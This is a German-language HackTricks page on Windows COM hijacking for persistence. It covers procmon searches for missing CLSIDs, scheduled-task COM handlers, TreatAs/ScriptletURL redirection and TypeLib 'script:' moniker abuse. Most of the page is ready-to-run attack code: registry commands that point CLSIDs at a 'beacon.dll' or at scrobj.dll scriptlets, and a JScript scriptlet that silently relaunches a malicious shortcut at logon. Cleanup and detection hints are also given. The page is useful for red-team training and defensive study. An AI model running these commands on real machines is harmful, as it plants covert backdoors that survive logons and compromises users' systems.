# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Suchen nach nicht existierenden COM-Komponenten

Da die Werte von HKCU vom Benutzer verändert werden können, kann **COM Hijacking** als **Persistenzmechanismus** genutzt werden. Mit `procmon` ist es einfach, nach COM-Registrierungen zu suchen, die noch nicht existieren und vom Angreifer erstellt werden könnten. Klassische Filter:

- **RegOpenKey**-Operationen.
- bei denen das _Result_ **NAME NOT FOUND** ist.
- und der _Path_ mit **InprocServer32** endet.

Nützliche Variationen bei der Suche:

- Suchen Sie auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind out-of-process-Server und starten eine vom Angreifer kontrollierte EXE anstelle einer DLL.
- Suchen Sie neben `InprocServer32` auch nach **`TreatAs`** und **`ScriptletURL`** Registry-Operationen. Aktuelle Erkennungsinhalte und Malware-Analysen heben diese weiterhin hervor, weil sie viel seltener als normale COM-Registrierungen sind und daher eine hohe Aussagekraft haben.
- Kopieren Sie das legitime **`ThreadingModel`** aus dem originalen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`, wenn Sie eine Registrierung nach HKCU klonen. Die Verwendung des falschen Modells bricht häufig die Aktivierung und macht das Hijack auffällig.
- Untersuchen Sie auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansicht (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.

Sobald Sie entschieden haben, welche nicht existierende COM-Komponente Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie eine COM nachahmen, die alle paar Sekunden geladen wird, da das übertrieben sein kann._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Übernehmbare Task Scheduler COM-Komponenten

Windows Tasks verwenden Custom Triggers, um COM-Objekte aufzurufen, und da sie über den Task Scheduler ausgeführt werden, ist es einfacher vorherzusagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Anhand der Ausgabe kannst du z. B. einen Eintrag auswählen, der **bei jeder Benutzeranmeldung** ausgeführt wird.

Wenn du nun nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** sowie in HKLM und HKCU suchst, wirst du normalerweise feststellen, dass der Wert in HKCU nicht existiert.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann können Sie einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird Ihre backdoor ausgelöst.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` erlaubt, dass ein CLSID durch einen anderen emuliert wird. Aus offensiver Sicht bedeutet das, dass Sie den ursprünglichen CLSID unangetastet lassen, einen zweiten benutzerbezogenen CLSID anlegen können, der auf `scrobj.dll` zeigt, und dann das tatsächliche COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige umleiten.

Das ist nützlich, wenn:

- die Zielanwendung bereits beim Logon oder beim Start der Anwendung eine stabile CLSID instanziiert
- Sie eine reine Registry-Weiterleitung anstatt das ursprüngliche `InprocServer32` ersetzen möchten
- Sie ein lokales oder entferntes `.sct`-Scriptlet über den Wert `ScriptletURL` ausführen möchten

Beispiel-Workflow (angepasst aus öffentlichem Atomic Red Team tradecraft und älteren Untersuchungen zum COM-Registry-Abuse):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus, sodass du das payload als lokale Datei behalten oder es remote über HTTP/HTTPS laden kannst.
- `TreatAs` ist besonders praktisch, wenn die originale COM-Registrierung in HKLM komplett und stabil ist, weil du dann nur eine kleine pro-Benutzer-Umleitung brauchst, anstatt den gesamten Baum zu spiegeln.
- Zur Validierung ohne auf den natürlichen Trigger zu warten, kannst du das gefälschte ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, wenn die Zielklasse STA-Aktivierung unterstützt.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieren COM-Interfaces und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, kann das OS auch die zugehörige TypeLib laden, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` konsultiert. Wenn der TypeLib-Pfad durch einen **moniker** ersetzt wird, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – das ergibt eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten angesprochen werden.

Dies wurde beim Microsoft Web Browser control beobachtet (häufig geladen von Internet Explorer, Apps, die WebBrowser einbetten, und sogar `explorer.exe`).

### Steps (PowerShell)

1) Identifiziere die TypeLib (LIBID), die von einer häufig genutzten CLSID verwendet wird. Beispiel-CLSID, die oft von Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Setze den benutzerbezogenen TypeLib-Pfad auf ein lokales Scriptlet mittels des `script:`-Monikers (keine Admin-Rechte erforderlich):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Lege eine minimale JScript `.sct` ab, die deinen primary payload neu startet (z. B. eine `.lnk`, die von der initial chain verwendet wird):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – das Öffnen von IE, einer Anwendung, die das WebBrowser control einbettet, oder sogar routinemäßige Explorer-Aktivitäten laden die TypeLib und führen das scriptlet aus, wodurch Ihre Kette bei Anmeldung/Neustart wieder aktiviert wird.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Hinweise
- Sie können dieselbe Logik auf andere häufig auftretende COM-Komponenten anwenden; ermitteln Sie zuerst immer das reale `LIBID` aus `HKCR\CLSID\{CLSID}\TypeLib`.
- Auf 64-Bit-Systemen können Sie außerdem den `win64`-Unterschlüssel für 64-Bit-Anwendungen befüllen.

## Referenzen

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
